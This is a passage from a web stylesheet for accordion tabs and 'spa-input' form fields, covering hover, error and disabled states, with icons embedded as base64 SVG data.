MjgwNzUsMC42NjY3MzMxMjEgMjQuOTc2MjgzNiwwLjc1OTA2ODgwNiBDMjQuMTY5NzU5NiwwLjg1MTQwNDQ5MiAyMy40MzUwODQ5LDEuMjY2NjUxMiAyMi45NCwxLjkxIEwxMi43NSwxNC44MyBMNS42Miw5IEM0Ljk5MjMyMjM0LDguNDg1MTkxNzcgNC4xODI4MDc1Miw4LjI0NjczMzEyIDMuMzc2MjgzNTgsOC4zMzkwNjg4MSBDMi41Njk3NTk2Myw4LjQzMTQwNDQ5IDEuODM1MDg0OTEsOC44NDY2NTEyIDEuMzQsOS40OSBDMC4yODY1NTE1MzUsMTAuODI0MzA5NSAwLjQ5MDc3MzI1LDEyLjc1NTUzNjYgMS44LDEzLjg0IEwxMS4zLDIxLjU2IEMxMS45MjgyMjcyLDIyLjA3ODA0NDggMTIuNzQwMDQ4MiwyMi4zMTg0NjY0IDEzLjU0OTA2MDcsMjIuMjI2MDYxOCBDMTQuMzU4MDczMiwyMi4xMzM2NTcxIDE1LjA5NDc3MDYsMjEuNzE2MzY1IDE1LjU5LDIxLjA3IEwyNy42OSw1LjczIEMyOC43MTQ3NzgzLDQuMzk5ODM4NDIgMjguNTA3Mzg3NywyLjQ5ODAyMjgzIDI3LjIyLDEuNDIgTDI3LjIyLDEuNDIgWiIgaWQ9IlNoYXBlIj48L3BhdGg+CiAgICAgICAgICAgIDwvZz4KICAgICAgICA8L2c+CiAgICA8L2c+Cjwvc3ZnPg==")
        }

        .medium-up [data-accordion-type="tabs"].accordion-wrapper>.accordion-tablist>.accordion-tab.success .panel-status-icon.success,
        .medium-up [data-accordion-type="tabs"].accordion-wrapper.innerPanels>.accordion-tablist>.accordion-tab.success .panel-status-icon.success {
            display: inline-block
        }

        .medium-up [data-accordion-type="tabs"].accordion-wrapper>.accordion-tablist>.accordion-tab.warning .panel-status-icon.warning,
        .medium-up [data-accordion-type="tabs"].accordion-wrapper.innerPanels>.accordion-tablist>.accordion-tab.warning .panel-status-icon.warning {
            display: inline-block
        }

        .medium-up [data-accordion-type="tabs"].accordion-wrapper>.accordion-tablist>.accordion-tab.warning .panel-status-icon.success,
        .medium-up [data-accordion-type="tabs"].accordion-wrapper.innerPanels>.accordion-tablist>.accordion-tab.warning .panel-status-icon.success {
            display: none
        }

        .medium-up [data-accordion-type="tabs"].accordion-wrapper>.accordion-tablist>.accordion-tab.error .panel-status-icon.error,
        .medium-up [data-accordion-type="tabs"].accordion-wrapper.innerPanels>.accordion-tablist>.accordion-tab.error .panel-status-icon.error {
            display: inline-block
        }

        .medium-up [data-accordion-type="tabs"].accordion-wrapper>.accordion-tablist>.accordion-tab.error .panel-status-icon.warning,
        .medium-up [data-accordion-type="tabs"].accordion-wrapper>.accordion-tablist>.accordion-tab.error .panel-status-icon.success,
        .medium-up [data-accordion-type="tabs"].accordion-wrapper.innerPanels>.accordion-tablist>.accordion-tab.error .panel-status-icon.warning,
        .medium-up [data-accordion-type="tabs"].accordion-wrapper.innerPanels>.accordion-tablist>.accordion-tab.error .panel-status-icon.success {
            display: none
        }

        .medium-up [data-accordion-type="tabs"].accordion-wrapper>.accordion-panels,
        .medium-up [data-accordion-type="tabs"].accordion-wrapper.innerPanels>.accordion-panels {
            margin-top: -2px
        }

        .medium-up [data-accordion-type="tabs"].accordion-wrapper>.accordion-panels>.accordion-panel>.panel-header,
        .medium-up [data-accordion-type="tabs"].accordion-wrapper.innerPanels>.accordion-panels>.accordion-panel>.panel-header {
            display: none;
            visibility: hidden
        }

        .medium-up [data-accordion-type="tabs"].accordion-wrapper>.accordion-panels>.accordion-panel .panel-content,
        .medium-up [data-accordion-type="tabs"].accordion-wrapper.innerPanels>.accordion-panels>.accordion-panel .panel-content {
            background-color: #fff;
            -webkit-transition: none;
            transition: none
        }

        .medium-up [data-accordion-type="tabs"].accordion-wrapper>.accordion-panels>.accordion-panel.active,
        .medium-up [data-accordion-type="tabs"].accordion-wrapper.innerPanels>.accordion-panels>.accordion-panel.active {
            border: 1px solid #ECE7DD
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 {
            width: 100%;
            position: relative
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-label {
            font-size: 14px;
            font-weight: normal;
            color: #6b5e51;
            display: block
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .toggle-trigger {
            background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMiAyMiI+PHRpdGxlPnF1ZXN0aW9uLW1hcms8L3RpdGxlPjxwYXRoIGQ9Ik0yMSAxMWExMCAxMCAwIDEgMS0xMC0xMCAxMCAxMCAwIDAgMSAxMCAxMHoiIGZpbGw9IiMyYjcyYjkiLz48cGF0aCBkPSJNMTEuMTQgNi44MzdhMS42MTYgMS42MTYgMCAwIDAtMS4xNDguMzQ0LjkuOSAwIDAgMSAuNC43NDYgMS4xNDIgMS4xNDIgMCAwIDEtLjQuOTE5IDEuNjI5IDEuNjI5IDAgMCAxLS45NzYuNCAxLjM4NCAxLjM4NCAwIDAgMS0xLjAzMy0uNCAxLjQyOSAxLjQyOSAwIDAgMS0uNC0xLjA5MSAyLjI1MiAyLjI1MiAwIDAgMSAxLjA4OC0xLjk1NSA0LjczNyA0LjczNyAwIDAgMSAyLjc1Ni0uOCA0LjI1NCA0LjI1NCAwIDAgMSAyLjY0MS44IDIuNTExIDIuNTExIDAgMCAxIC45NzYgMi4xMjQgMi43MzcgMi43MzcgMCAwIDEtLjIzIDEuMTQ4IDMuMzQ1IDMuMzQ1IDAgMCAxLS42MzIuODYxIDE0LjI2MyAxNC4yNjMgMCAwIDAtMS4zNzggMS4wMzMgNS4xNzcgNS4xNzcgMCAwIDAtLjUxNy41NzRsLS4yODcuNjg2YS45NDUuOTQ1IDAgMCAxLS4yMy41MiAxLjMzOSAxLjMzOSAwIDAgMS0uNjMyLjExNWgtLjUxNGEuOS45IDAgMCAxLS43NDYtLjIzIDEuMTQ2IDEuMTQ2IDAgMCAxLS4yMy0uNzQ2di0uNDU0YzAtLjQuNjg5LS42MzIgMS40OTMtMS4wOTEgMS4zNzgtMS4xNDggMS4zNzgtMS43MjIgMS4zNzgtMi4zNTRhLjkzMS45MzEgMCAwIDAtLjQtLjggMS4xODIgMS4xODIgMCAwIDAtLjk3OS0uMzQ5em0tLjM0IDEwLjE2M2ExLjE0MiAxLjE0MiAwIDAgMS0uOTE5LS40IDEuMzU1IDEuMzU1IDAgMCAxLS40LS45MTkgMS4xNDIgMS4xNDIgMCAwIDEgLjQtLjkxOSAxLjM1NSAxLjM1NSAwIDAgMSAuOTE5LS40IDEuMTQyIDEuMTQyIDAgMCAxIC45MTkuNCAxLjM1NSAxLjM1NSAwIDAgMSAuNC45MTkgMS4xNDIgMS4xNDIgMCAwIDEtLjQuOTE5IDEuMTQyIDEuMTQyIDAgMCAxLS45MTkuNHoiIGZpbGw9IiNmZmYiLz48L3N2Zz4=");
            background-position: center center;
            background-repeat: no-repeat;
            height: 20px;
            width: 20px;
            margin: 4px 0 0 10px;
            vertical-align: top;
            display: inline-block;
            z-index: 31
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .toggle-trigger:hover {
            background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMiAyMiI+PHRpdGxlPnF1ZXN0aW9uLW1hcms8L3RpdGxlPjxwYXRoIGQ9Ik0yMSAxMWExMCAxMCAwIDEgMS0xMC0xMCAxMCAxMCAwIDAgMSAxMCAxMHoiIGZpbGw9IiMyYjU5YTgiLz48cGF0aCBkPSJNMTEuMTQgNi44MzdhMS42MTYgMS42MTYgMCAwIDAtMS4xNDguMzQ0LjkuOSAwIDAgMSAuNC43NDYgMS4xNDIgMS4xNDIgMCAwIDEtLjQuOTE5IDEuNjI5IDEuNjI5IDAgMCAxLS45NzYuNCAxLjM4NCAxLjM4NCAwIDAgMS0xLjAzMy0uNCAxLjQyOSAxLjQyOSAwIDAgMS0uNC0xLjA5MSAyLjI1MiAyLjI1MiAwIDAgMSAxLjA4OC0xLjk1NSA0LjczNyA0LjczNyAwIDAgMSAyLjc1Ni0uOCA0LjI1NCA0LjI1NCAwIDAgMSAyLjY0MS44IDIuNTExIDIuNTExIDAgMCAxIC45NzYgMi4xMjQgMi43MzcgMi43MzcgMCAwIDEtLjIzIDEuMTQ4IDMuMzQ1IDMuMzQ1IDAgMCAxLS42MzIuODYxIDE0LjI2MyAxNC4yNjMgMCAwIDAtMS4zNzggMS4wMzMgNS4xNzcgNS4xNzcgMCAwIDAtLjUxNy41NzRsLS4yODcuNjg2YS45NDUuOTQ1IDAgMCAxLS4yMy41MiAxLjMzOSAxLjMzOSAwIDAgMS0uNjMyLjExNWgtLjUxNGEuOS45IDAgMCAxLS43NDYtLjIzIDEuMTQ2IDEuMTQ2IDAgMCAxLS4yMy0uNzQ2di0uNDU0YzAtLjQuNjg5LS42MzIgMS40OTMtMS4wOTEgMS4zNzgtMS4xNDggMS4zNzgtMS43MjIgMS4zNzgtMi4zNTRhLjkzMS45MzEgMCAwIDAtLjQtLjggMS4xODIgMS4xODIgMCAwIDAtLjk3OS0uMzQ5em0tLjM0IDEwLjE2M2ExLjE0MiAxLjE0MiAwIDAgMS0uOTE5LS40IDEuMzU1IDEuMzU1IDAgMCAxLS40LS45MTkgMS4xNDIgMS4xNDIgMCAwIDEgLjQtLjkxOSAxLjM1NSAxLjM1NSAwIDAgMSAuOTE5LS40IDEuMTQyIDEuMTQyIDAgMCAxIC45MTkuNCAxLjM1NSAxLjM1NSAwIDAgMSAuNC45MTkgMS4xNDIgMS4xNDIgMCAwIDEtLjQuOTE5IDEuMTQyIDEuMTQyIDAgMCAxLS45MTkuNHoiIGZpbGw9IiNmZmYiLz48L3N2Zz4=")
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .toggle-trigger-link {
            display: block;
            margin: 3px 0 0 0;
            font-size: 12px;
            line-height: 1.0
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .close-trigger {
            position: absolute;
            right: 8px;
            top: 8px;
            height: 20px;
            width: 20px;
            padding-top: 3px 0 0 5px
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .close-trigger:before,
        [data-sparta-container] .spa-input.spa-input--sparta2 .close-trigger:after {
            display: block;
            position: absolute;
            content: '';
            height: 20px;
            width: 4px;
            background-color: #6b5e51;
            top: 10px;
            right: 6px;
            -webkit-transform: translateX(-50%) translateY(-50%) rotate(45deg);
            transform: translateX(-50%) translateY(-50%) rotate(45deg)
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .close-trigger:after {
            -webkit-transform: translateX(-50%) translateY(-50%) rotate(-45deg);
            transform: translateX(-50%) translateY(-50%) rotate(-45deg)
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .close-trigger:hover:before,
        [data-sparta-container] .spa-input.spa-input--sparta2 .close-trigger:hover:after,
        [data-sparta-container] .spa-input.spa-input--sparta2 .close-trigger:focus:before,
        [data-sparta-container] .spa-input.spa-input--sparta2 .close-trigger:focus:after {
            background-color: #524940
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .toggle-trigger,
        [data-sparta-container] .spa-input.spa-input--sparta2 .close-trigger {
            cursor: pointer;
            text-decoration: none
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .toggle-trigger:hover,
        [data-sparta-container] .spa-input.spa-input--sparta2 .close-trigger:hover {
            text-decoration: none
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-hint {
            margin: 0 0 0 0;
            color: #6b5e51;
            font-size: 11px;
            min-height: 10px
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-error-message {
            color: #DC1431;
            margin: 16px 0 0 0;
            font-size: 14px;
            line-height: 16px;
            min-height: 18px;
            background-position: 0 0;
            background-repeat: no-repeat;
            background-size: 18px;
            padding: 2px 0 0 28px
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-error-message:empty {
            background-image: none;
            padding: 0;
            margin: 0;
            min-height: 0
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .input-help {
            display: none;
            position: relative;
            background-color: #ECF6FD;
            border: 1px solid #B6DCFC;
            padding: 15px 15px 18px 15px;
            font-size: 16px;
            margin: 15px 0
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .input-help .head {
            color: #333;
            font-size: 16px;
            padding-right: 60px;
            margin-bottom: 10px
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .input-help .body {
            color: #333;
            font-size: 12px;
            line-height: 18px
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .input-help:visible~.spa-input-error-message:visible {
            margin-top: 16px
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box {
            margin: 0
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-label {
            color: #333
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-label.spa-error-form-label--validation,
        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-label.spa-error-form-label--required {
            color: #DC1431
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-hint {
            line-height: 20px
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .input-help {
            margin-top: 0
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .toggle-trigger-box {
            position: absolute;
            display: inline-block;
            vertical-align: top;
            background-color: transparent;
            z-index: 31;
            margin: 1px 0 0 -39px;
            cursor: pointer
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .toggle-trigger-box .toggle-trigger {
            background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMiAyMiI+PHRpdGxlPnF1ZXN0aW9uLW1hcms8L3RpdGxlPjxwYXRoIGQ9Ik0yMSAxMWExMCAxMCAwIDEgMS0xMC0xMCAxMCAxMCAwIDAgMSAxMCAxMHoiIGZpbGw9IiMyYjcyYjkiLz48cGF0aCBkPSJNMTEuMTQgNi44MzdhMS42MTYgMS42MTYgMCAwIDAtMS4xNDguMzQ0LjkuOSAwIDAgMSAuNC43NDYgMS4xNDIgMS4xNDIgMCAwIDEtLjQuOTE5IDEuNjI5IDEuNjI5IDAgMCAxLS45NzYuNCAxLjM4NCAxLjM4NCAwIDAgMS0xLjAzMy0uNCAxLjQyOSAxLjQyOSAwIDAgMS0uNC0xLjA5MSAyLjI1MiAyLjI1MiAwIDAgMSAxLjA4OC0xLjk1NSA0LjczNyA0LjczNyAwIDAgMSAyLjc1Ni0uOCA0LjI1NCA0LjI1NCAwIDAgMSAyLjY0MS44IDIuNTExIDIuNTExIDAgMCAxIC45NzYgMi4xMjQgMi43MzcgMi43MzcgMCAwIDEtLjIzIDEuMTQ4IDMuMzQ1IDMuMzQ1IDAgMCAxLS42MzIuODYxIDE0LjI2MyAxNC4yNjMgMCAwIDAtMS4zNzggMS4wMzMgNS4xNzcgNS4xNzcgMCAwIDAtLjUxNy41NzRsLS4yODcuNjg2YS45NDUuOTQ1IDAgMCAxLS4yMy41MiAxLjMzOSAxLjMzOSAwIDAgMS0uNjMyLjExNWgtLjUxNGEuOS45IDAgMCAxLS43NDYtLjIzIDEuMTQ2IDEuMTQ2IDAgMCAxLS4yMy0uNzQ2di0uNDU0YzAtLjQuNjg5LS42MzIgMS40OTMtMS4wOTEgMS4zNzgtMS4xNDggMS4zNzgtMS43MjIgMS4zNzgtMi4zNTRhLjkzMS45MzEgMCAwIDAtLjQtLjggMS4xODIgMS4xODIgMCAwIDAtLjk3OS0uMzQ5em0tLjM0IDEwLjE2M2ExLjE0MiAxLjE0MiAwIDAgMS0uOTE5LS40IDEuMzU1IDEuMzU1IDAgMCAxLS40LS45MTkgMS4xNDIgMS4xNDIgMCAwIDEgLjQtLjkxOSAxLjM1NSAxLjM1NSAwIDAgMSAuOTE5LS40IDEuMTQyIDEuMTQyIDAgMCAxIC45MTkuNCAxLjM1NSAxLjM1NSAwIDAgMSAuNC45MTkgMS4xNDIgMS4xNDIgMCAwIDEtLjQuOTE5IDEuMTQyIDEuMTQyIDAgMCAxLS45MTkuNHoiIGZpbGw9IiNmZmYiLz48L3N2Zz4=");
            position: absolute;
            background-position: center center;
            background-repeat: no-repeat;
            margin: 9px 9px 9px 9px
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .toggle-trigger-box:hover .toggle-trigger,
        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .toggle-trigger-box:focus .toggle-trigger {
            background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMiAyMiI+PHRpdGxlPnF1ZXN0aW9uLW1hcms8L3RpdGxlPjxwYXRoIGQ9Ik0yMSAxMWExMCAxMCAwIDEgMS0xMC0xMCAxMCAxMCAwIDAgMSAxMCAxMHoiIGZpbGw9IiMyYjU5YTgiLz48cGF0aCBkPSJNMTEuMTQgNi44MzdhMS42MTYgMS42MTYgMCAwIDAtMS4xNDguMzQ0LjkuOSAwIDAgMSAuNC43NDYgMS4xNDIgMS4xNDIgMCAwIDEtLjQuOTE5IDEuNjI5IDEuNjI5IDAgMCAxLS45NzYuNCAxLjM4NCAxLjM4NCAwIDAgMS0xLjAzMy0uNCAxLjQyOSAxLjQyOSAwIDAgMS0uNC0xLjA5MSAyLjI1MiAyLjI1MiAwIDAgMSAxLjA4OC0xLjk1NSA0LjczNyA0LjczNyAwIDAgMSAyLjc1Ni0uOCA0LjI1NCA0LjI1NCAwIDAgMSAyLjY0MS44IDIuNTExIDIuNTExIDAgMCAxIC45NzYgMi4xMjQgMi43MzcgMi43MzcgMCAwIDEtLjIzIDEuMTQ4IDMuMzQ1IDMuMzQ1IDAgMCAxLS42MzIuODYxIDE0LjI2MyAxNC4yNjMgMCAwIDAtMS4zNzggMS4wMzMgNS4xNzcgNS4xNzcgMCAwIDAtLjUxNy41NzRsLS4yODcuNjg2YS45NDUuOTQ1IDAgMCAxLS4yMy41MiAxLjMzOSAxLjMzOSAwIDAgMS0uNjMyLjExNWgtLjUxNGEuOS45IDAgMCAxLS43NDYtLjIzIDEuMTQ2IDEuMTQ2IDAgMCAxLS4yMy0uNzQ2di0uNDU0YzAtLjQuNjg5LS42MzIgMS40OTMtMS4wOTEgMS4zNzgtMS4xNDggMS4zNzgtMS43MjIgMS4zNzgtMi4zNTRhLjkzMS45MzEgMCAwIDAtLjQtLjggMS4xODIgMS4xODIgMCAwIDAtLjk3OS0uMzQ5em0tLjM0IDEwLjE2M2ExLjE0MiAxLjE0MiAwIDAgMS0uOTE5LS40IDEuMzU1IDEuMzU1IDAgMCAxLS40LS45MTkgMS4xNDIgMS4xNDIgMCAwIDEgLjQtLjkxOSAxLjM1NSAxLjM1NSAwIDAgMSAuOTE5LS40IDEuMTQyIDEuMTQyIDAgMCAxIC45MTkuNCAxLjM1NSAxLjM1NSAwIDAgMSAuNC45MTkgMS4xNDIgMS4xNDIgMCAwIDEtLjQuOTE5IDEuMTQyIDEuMTQyIDAgMCAxLS45MTkuNHoiIGZpbGw9IiNmZmYiLz48L3N2Zz4=")
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box:hover .spa-input-hint {
            color: #333
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box:hover .spa-input-text,
        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box:hover .spa-input-select {
            border-color: #9d8e80
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box:hover .spa-input-text:disabled~.spa-input-hint,
        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box:hover .spa-input-select:disabled~.spa-input-hint {
            color: #857B70
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box:hover .spa-input-text.datepicker {
            background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMCAyMCI+CiAgPGRlZnM+CiAgICA8c3R5bGU+CiAgICAgIC5hIHsKICAgICAgICBmaWxsOiAjOWQ4ZTgwOwogICAgICB9CiAgICA8L3N0eWxlPgogIDwvZGVmcz4KICA8dGl0bGU+ZGF0ZVBpY2tlcjwvdGl0bGU+CiAgPHBhdGggY2xhc3M9ImEiIGQ9Ik0xLjAyLDEuMjA5VjE4Ljc5MUgxOC45NzlWMS4yMDlIMS4wMlptMTQuOSwxLjM0NmExLjA0LDEuMDQsMCwxLDEtMS4wNDEsMS4wNEExLjAzOSwxLjAzOSwwLDAsMSwxNS45MTksMi41NTRabS0xMS45NzcsMEExLjA0LDEuMDQsMCwxLDEsMi45LDMuNTk0LDEuMDQsMS4wNCwwLDAsMSwzLjk0MiwyLjU1NFpNNS4zLDE3LjE2NEgyLjl2LTIuNEg1LjN2Mi40Wm0wLTMuNjY5SDIuOVYxMS4xSDUuM3YyLjRabTAtMy42NjdIMi45di0yLjRINS4zdjIuNFptMy45LDcuMzM2SDYuOHYtMi40SDkuMnYyLjRabTAtMy42NjlINi44VjExLjFIOS4ydjIuNFptMC0zLjY2N0g2Ljh2LTIuNEg5LjJ2Mi40Wk0xMy4xLDEzLjVIMTAuN1YxMS4xaDIuNHYyLjRabTAtMy42NjdIMTAuN3YtMi40aDIuNHYyLjRabTMuOSwzLjY2N2gtMi40VjExLjFoMi40djIuNFptMC0zLjY2N2gtMi40di0yLjRoMi40djIuNFoiLz4KPC9zdmc+Cg==")
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box:hover .spa-input-text.datepicker:disabled {
            background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMCAyMCI+CiAgPGRlZnM+CiAgICA8c3R5bGU+CiAgICAgIC5hIHsKICAgICAgICBmaWxsOiAjZDFjOWMwOwogICAgICB9CiAgICA8L3N0eWxlPgogIDwvZGVmcz4KICA8dGl0bGU+ZGF0ZVBpY2tlcjwvdGl0bGU+CiAgPHBhdGggY2xhc3M9ImEiIGQ9Ik0xLjAyLDEuMjA5VjE4Ljc5MUgxOC45NzlWMS4yMDlIMS4wMlptMTQuOSwxLjM0NmExLjA0LDEuMDQsMCwxLDEtMS4wNDEsMS4wNEExLjAzOSwxLjAzOSwwLDAsMSwxNS45MTksMi41NTRabS0xMS45NzcsMEExLjA0LDEuMDQsMCwxLDEsMi45LDMuNTk0LDEuMDQsMS4wNCwwLDAsMSwzLjk0MiwyLjU1NFpNNS4zLDE3LjE2NEgyLjl2LTIuNEg1LjN2Mi40Wm0wLTMuNjY5SDIuOVYxMS4xSDUuM3YyLjRabTAtMy42NjdIMi45di0yLjRINS4zdjIuNFptMy45LDcuMzM2SDYuOHYtMi40SDkuMnYyLjRabTAtMy42NjlINi44VjExLjFIOS4ydjIuNFptMC0zLjY2N0g2Ljh2LTIuNEg5LjJ2Mi40Wk0xMy4xLDEzLjVIMTAuN1YxMS4xaDIuNHYyLjRabTAtMy42NjdIMTAuN3YtMi40aDIuNHYyLjRabTMuOSwzLjY2N2gtMi40VjExLjFoMi40djIuNFptMC0zLjY2N2gtMi40di0yLjRoMi40djIuNFoiLz4KPC9zdmc+Cg==")
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box:hover .spa-input-text.datepicker.spa-error-form-input--validation,
        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box:hover .spa-input-text.datepicker.spa-error-form-input--required {
            background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMCAyMCI+CiAgPGRlZnM+CiAgICA8c3R5bGU+CiAgICAgIC5hIHsKICAgICAgICBmaWxsOiAjZGMxNDMxOwogICAgICB9CiAgICA8L3N0eWxlPgogIDwvZGVmcz4KICA8dGl0bGU+ZGF0ZVBpY2tlcjwvdGl0bGU+CiAgPHBhdGggY2xhc3M9ImEiIGQ9Ik0xLjAyLDEuMjA5VjE4Ljc5MUgxOC45NzlWMS4yMDlIMS4wMlptMTQuOSwxLjM0NmExLjA0LDEuMDQsMCwxLDEtMS4wNDEsMS4wNEExLjAzOSwxLjAzOSwwLDAsMSwxNS45MTksMi41NTRabS0xMS45NzcsMEExLjA0LDEuMDQsMCwxLDEsMi45LDMuNTk0LDEuMDQsMS4wNCwwLDAsMSwzLjk0MiwyLjU1NFpNNS4zLDE3LjE2NEgyLjl2LTIuNEg1LjN2Mi40Wm0wLTMuNjY5SDIuOVYxMS4xSDUuM3YyLjRabTAtMy42NjdIMi45di0yLjRINS4zdjIuNFptMy45LDcuMzM2SDYuOHYtMi40SDkuMnYyLjRabTAtMy42NjlINi44VjExLjFIOS4ydjIuNFptMC0zLjY2N0g2Ljh2LTIuNEg5LjJ2Mi40Wk0xMy4xLDEzLjVIMTAuN1YxMS4xaDIuNHYyLjRabTAtMy42NjdIMTAuN3YtMi40aDIuNHYyLjRabTMuOSwzLjY2N2gtMi40VjExLjFoMi40djIuNFptMC0zLjY2N2gtMi40di0yLjRoMi40djIuNFoiLz4KPC9zdmc+Cg==")
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box:hover .spa-input-select {
            background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMCAyMCI+PHRpdGxlPmNhcmF0X2hvdmVyPC90aXRsZT48cGF0aCBkPSJNMi4zODMsNy4yMjJsMi4wNi0yLjA2TDEwLDEwLjcxNiwxNS41NTUsNS4xNmwyLjA2MiwyLjA2TDEwLDE0Ljg0WiIgc3R5bGU9ImZpbGw6IzZiNWU1MSIvPjwvc3ZnPg==")
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box:hover .spa-input-select:disabled {
            background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMCAyMCI+PHRpdGxlPmNhcmF0X2RlZmF1bHQ8L3RpdGxlPjxwb2x5Z29uIHBvaW50cz0iMi40NjUgNy4yNTkgNC41MjUgNS4xOTkgMTAuMDgxIDEwLjc1NCAxNS42MzcgNS4xOTcgMTcuNjk5IDcuMjU3IDEwLjA4MSAxNC44NzcgMi40NjUgNy4yNTkiIHN0eWxlPSJmaWxsOiM4NTczNjMiLz48L3N2Zz4=")
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box:hover .spa-input-select.spa-error-form-input--validation,
        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box:hover .spa-input-select.spa-error-form-input--required {
            background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMCAyMCI+PGRlZnM+PHN0eWxlPi5hIHsgZmlsbDogI2RjMWUzMjsgfTwvc3R5bGU+PC9kZWZzPjx0aXRsZT5jYXJhdDwvdGl0bGU+PHBhdGggY2xhc3M9ImEiIGQ9Ik0yLjM4MyA3LjIyMmwyLjA2LTIuMDYgNS41NTYgNS41NTQgNS41NTYtNS41NTYgMi4wNjIgMi4wNi03LjYxOCA3LjYyLTcuNjE2LTcuNjE4eiIvPjwvc3ZnPg==")
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box:hover .spa-input-text.spa-error-form-input--validation,
        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box:hover .spa-input-text.spa-error-form-input--required,
        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box:hover .spa-input-textarea.spa-error-form-input--validation,
        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box:hover .spa-input-textarea.spa-error-form-input--required,
        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box:hover .spa-input-select.spa-error-form-input--validation,
        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box:hover .spa-input-select.spa-error-form-input--required {
            border-color: #DC1431
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-text {
            height: 40px;
            font-size: 18px;
            border: 1px solid #d1c9c0;
            display: inline-block;
            box-shadow: none
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-text::-ms-clear {
            display: none
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-text:focus {
            border-color: #0073CF !important;
            background-color: #fff !important
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-text:focus~.spa-input-hint {
            border-color: #000a23
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-text:disabled {
            border-color: #ece6dd !important;
            background-color: #fdfcfb !important;
            color: #857B70 !important;
            -webkit-opacity: 1;
            -webkit-text-fill-color: #857b70
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-text:disabled~.toggle-trigger-box {
            background-color: transparent !important
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-text:disabled~.spa-input-hint {
            color: #857B70
        }

        [data-sparta-container] .spa-input.spa-input--sparta2.spa-input-box .spa-input-text.datepicker {
